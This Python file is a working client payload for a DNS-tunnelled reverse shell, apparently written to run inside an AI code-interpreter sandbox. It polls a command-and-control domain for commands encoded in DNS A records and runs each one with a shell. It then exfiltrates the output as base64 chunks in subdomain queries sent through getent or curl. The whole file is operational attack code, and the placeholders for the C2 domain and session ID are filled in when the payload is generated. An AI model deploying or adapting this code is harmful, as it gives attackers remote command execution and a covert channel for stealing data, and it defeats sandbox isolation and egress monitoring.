"""
Client payload for DNS-based reverse shell.

This script runs in the AgentCore sandbox and:
- Polls the C2 DNS server for commands
- Executes received commands
- Exfiltrates output via DNS queries

Environment Variables:
- C2_DOMAIN: DNS domain for C2 server (default: c2.bt-research-control.com)
- POLL_INTERVAL: Seconds between polls (default: 3)
- USE_CURL_FOR_EXFIL: Use curl instead of getent for exfiltration (default: false)
  - Set to 'true' to avoid getent caching issues with identical outputs
  - getent (default) is more reliable but caches identical queries
  - curl avoids caching but may be less reliable
"""

import sys
import socket
import base64
import subprocess
import time
import hashlib
import os
from datetime import datetime


# Setup logging to file for debugging
class TeeOutput:
    """Write to both stdout and a log file."""
    def __init__(self, filename):
        self.terminal = sys.stdout
        try:
            self.log = open(filename, 'w', buffering=1)  # Line buffered
        except:
            self.log = None
    
    def write(self, message):
        self.terminal.write(message)
        if self.log:
            try:
                self.log.write(message)
                self.log.flush()
            except:
                pass
    
    def flush(self):
        self.terminal.flush()
        if self.log:
            try:
                self.log.flush()
            except:
                pass

# Enable logging to file (use current directory, not /tmp/)
sys.stdout = TeeOutput('c2_client.log')
sys.stderr = sys.stdout


# Configuration - These placeholders are replaced at payload generation time
DNS_DOMAIN = '__C2_DOMAIN_PLACEHOLDER__'
SESSION_ID = '__SESSION_ID_PLACEHOLDER__'
POLL_INTERVAL = int(os.environ.get('POLL_INTERVAL', '3'))  # seconds
MAX_LABEL_LENGTH = 60  # DNS labels max 63 chars; use 60 to be safe with base64 encoding
DNS_RETRY_ATTEMPTS = 3  # Number of retries for failed DNS queries
USE_CURL_FOR_EXFIL = os.environ.get('USE_CURL_FOR_EXFIL', 'false').lower() == 'true'  # Use curl instead of getent for exfiltration


def get_client_id():
    """Get the session ID (injected at payload generation time)."""
    return SESSION_ID


def dns_query(query_name, record_type='A', retry=True):
    """
    Perform a DNS query using getent (available in Code Interpreter).
    getent can resolve DNS and return the IP address!
    """
    attempts = DNS_RETRY_ATTEMPTS if retry else 1
    
    for attempt in range(attempts):
        try:
            # Use getent hosts to resolve DNS
            result = subprocess.run(
                ['getent', 'hosts', query_name],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                output = result.stdout.strip()
                if output:
                    # getent returns: "IP_ADDRESS hostname"
                    # Extract just the IP address
                    ip_address = output.split()[0]
                    return ip_address
            return None
        except Exception as e:
            if attempt < attempts - 1:
                wait_time = 2 ** attempt
                print(f"DNS query failed (attempt {attempt + 1}/{attempts}), retrying in {wait_time}s: {e}")
                time.sleep(wait_time)
            else:
                print(f"DNS query error after {attempts} attempts: {e}")
    
    return None


def poll_for_command(client_id, cmd_seq=0):
    """
    Poll the C2 server for a command using A record queries.
    
    **ULTRA-SIMPLE A-RECORD PROTOCOL:**
    Since TXT records don't work but A records do, we encode commands in IP addresses.
    - Query: cmd.<cmd_seq>.<client_id>.<domain>  (cmd_seq makes each poll unique)
    - Response: 127.0.0.1 = IDLE
    - Response: 192.168.0.1 = EXIT (session terminated)
    - Response: 10.X.Y.Z = Command available
    - Then query chunks: c0.<client_id>.<domain>, c1.<client_id>.<domain>, etc.
    - Each chunk IP encodes 3 bytes of base64 data in octets 1-3 (octet 0 = 10)
    - Last chunk has octet 0 = 11 to signal end
    """
    # First, poll for command availability (include cmd_seq to make each poll unique)
    query_name = f"cmd.{cmd_seq}.{client_id}.{DNS_DOMAIN}"
    response = dns_query(query_name, 'A')
    
    if not response or response == "127.0.0.1":
        return None  # IDLE - no command available
    
    if response == "192.168.0.1":
        print("[*] Session terminated by operator, exiting...")
        return "EXIT"  # Special command to exit
    
    # Command available! Fetch chunks silently
    command_b64 = ""
    chunk_num = 0
    
    while chunk_num < 50:  # Max 50 chunks = ~150 bytes command
        chunk_query = f"c{chunk_num}.{client_id}.{DNS_DOMAIN}"
        chunk_response = dns_query(chunk_query, 'A')
        
        if not chunk_response:
            break
        
        try:
            octets = chunk_response.split('.')
            if len(octets) != 4:
                break
            
            # Check if this is the last chunk (starts with 11)
            is_last = (octets[0] == '11')
            
            # Extract 3 bytes of data from octets 1, 2, 3
            for i in range(1, 4):
                val = int(octets[i])
                if val > 0:  # 0 = padding/end
                    command_b64 += chr(val)
            
            if is_last:
                break
            
            chunk_num += 1
        except Exception as e:
            print(f"[ERROR] Chunk decode error: {e}")
            break
    
    # Decode the base64 command
    if command_b64:
        try:
            command = base64.b64decode(command_b64).decode()
            print(f"[INFO] ← Received: {command}")
            return command
        except Exception as e:
            print(f"[ERROR] Failed to decode command (got {len(command_b64)} bytes base64)")
    
    return None


def execute_command(command):
    """Execute a shell command and return the output."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
        print(f"[INFO] → Output: {len(output)} bytes")
        return output if output else "(No output)"
    except subprocess.TimeoutExpired:
        print(f"[ERROR] Command timed out")
        return "Error: Command timed out (30s)"
    except Exception as e:
        print(f"[ERROR] Execution error: {e}")
        return f"Error executing command: {str(e)}"


def check_exfil_status(client_id):
    """
    Check if server already has output for this session.
    Returns True if we should proceed with exfiltration, False if server already has it.
    """
    query_name = f"status.{client_id}.{DNS_DOMAIN}"
    
    try:
        result = subprocess.run(
            ['getent', 'hosts', query_name],
            capture_output=True,
            text=True,
            timeout=2
        )
        
        if result.returncode == 0 and result.stdout:
            ip = result.stdout.split()[0]
            if ip == "0.0.0.2":
                return False  # Server already has it
            elif ip == "0.0.0.1":
                return True  # Server ready
    except:
        pass  # Silent failure, proceed with exfiltration
    
    return True


def exfiltrate_data(client_id, data, cmd_seq=0):
    """
    Exfiltrate data via DNS queries by chunking it into subdomains.
    Format: <seq>.<chunk_num>.<total_chunks>.<base64_data>.<client_id>.<domain>
    """
    # Check if server already has this output
    if not check_exfil_status(client_id):
        return  # Skip silently
    
    # Encode data in base64
    encoded_data = base64.b64encode(data.encode()).decode()
    
    # Handle empty output with sentinel value
    if not encoded_data:
        encoded_data = 'ZZEmpty'
    
    # Replace '=' with '-' for DNS compatibility
    # The server will reverse this transformation
    encoded_data = encoded_data.replace('=', '-')
    
    # Split into chunks that fit DNS label length limits
    chunks = [encoded_data[i:i+MAX_LABEL_LENGTH] 
              for i in range(0, len(encoded_data), MAX_LABEL_LENGTH)]
    
    total_chunks = len(chunks)
    
    print(f"[INFO] ↑ Sending: {len(data)} bytes in {total_chunks} chunks")
    
    # Send each chunk via DNS query
    # Two methods available:
    # 1. getent (default) - More reliable, but may cache identical queries
    # 2. curl (USE_CURL_FOR_EXFIL=true) - No caching, but less reliable
    failed_chunks = []
    for i, chunk in enumerate(chunks):
        chunk_num = i + 1
        
        success = False
        for attempt in range(DNS_RETRY_ATTEMPTS):
            try:
                # Add timestamp to make each query unique (prevent caching)
                # Generate fresh timestamp for each attempt
                timestamp_ms = int(time.time() * 1000) % 10000  # Last 4 digits of timestamp
                # Format: seq.chunk.total.timestamp.base64data.cmd_seq.session_id.domain
                # Put cmd_seq between data and session_id to break cache on identical outputs
                query_name = f"{cmd_seq}.{chunk_num}.{total_chunks}.{timestamp_ms}.{chunk}.{cmd_seq}.{client_id}.{DNS_DOMAIN}"
                
                if USE_CURL_FOR_EXFIL:
                    # Method 1: Use curl to trigger DNS query
                    # curl will trigger DNS lookup even though HTTP connection fails
                    # This avoids getent caching issues with identical outputs
                    result = subprocess.run(
                        ['curl', '-s', '--max-time', '2', f'http://{query_name}'],
                        capture_output=True,
                        timeout=3,
                        text=True
                    )
                    # curl returns 0 even if connection fails (DNS lookup succeeded)
                    success = True
                    break
                else:
                    # Method 2: Use getent to trigger DNS query (default)
                    # More reliable but may cache identical queries
                    result = subprocess.run(
                        ['getent', 'hosts', query_name],
                        capture_output=True,
                        timeout=2,
                        text=True
                    )
                    
                    # Check if query succeeded
                    if result.returncode == 0:
                        success = True
                        break
                    else:
                        # Query failed, wait before retry
                        if attempt < DNS_RETRY_ATTEMPTS - 1:
                            time.sleep(0.1 * (attempt + 1))  # Exponential backoff
            except Exception as e:
                # Log error and retry
                if attempt < DNS_RETRY_ATTEMPTS - 1:
                    time.sleep(0.1 * (attempt + 1))
                else:
                    print(f"[WARN] Chunk {chunk_num}/{total_chunks} failed after {DNS_RETRY_ATTEMPTS} attempts")
                    failed_chunks.append(chunk_num)
        
        if success:
            time.sleep(0.05)  # Small delay between successful chunks
    
    # Report results
    if failed_chunks:
        print(f"[WARN] Failed to send {len(failed_chunks)} chunks: {failed_chunks}")
    else:
        print(f"[INFO] ✓ All {total_chunks} chunks sent successfully")


def main():
    """Main client loop."""
    client_id = get_client_id()
    print(f"[*] Session ID: {client_id}")
    print(f"[*] DNS Domain: {DNS_DOMAIN}")
    print(f"[*] Poll Interval: {POLL_INTERVAL}s")
    print(f"[*] DNS Retry Attempts: {DNS_RETRY_ATTEMPTS}")
    print(f"[*] Starting reverse shell client...\n")
    
    # Track last executed command to avoid re-execution
    last_command = None
    cmd_sequence = 0  # Counter to make each command's DNS queries unique
    
    while True:
        try:
            # Increment command sequence at the start of each loop
            # This ensures polling and exfiltration use the same sequence number
            cmd_sequence += 1
            
            # Poll for command (include cmd_seq to make each poll unique)
            command = poll_for_command(client_id, cmd_seq=cmd_sequence)
            
            if command:
                # Skip if this is the same command we just executed
                # (Server keeps commands in memory for DNS retries)
                if command == last_command:
                    time.sleep(POLL_INTERVAL)
                    continue
                
                # Special commands
                if command == 'EXIT' or command.lower() == 'exit':
                    print("[*] Exit command received. Terminating.")
                    break
                
                # Execute command
                output = execute_command(command)
                
                # Brief pause before exfiltration to let DNS settle
                time.sleep(0.5)
                
                # Exfiltrate output
                exfiltrate_data(client_id, output, cmd_seq=cmd_sequence)
                
                # Remember this command to avoid re-execution
                last_command = command
                print()  # Blank line for readability
                
            # Wait before next poll
            time.sleep(POLL_INTERVAL)
            
        except KeyboardInterrupt:
            print("\n[*] Client interrupted. Exiting.")
            break
        except Exception as e:
            print(f"[!] Error in main loop: {e}")
            time.sleep(POLL_INTERVAL)


if __name__ == '__main__':
    main()

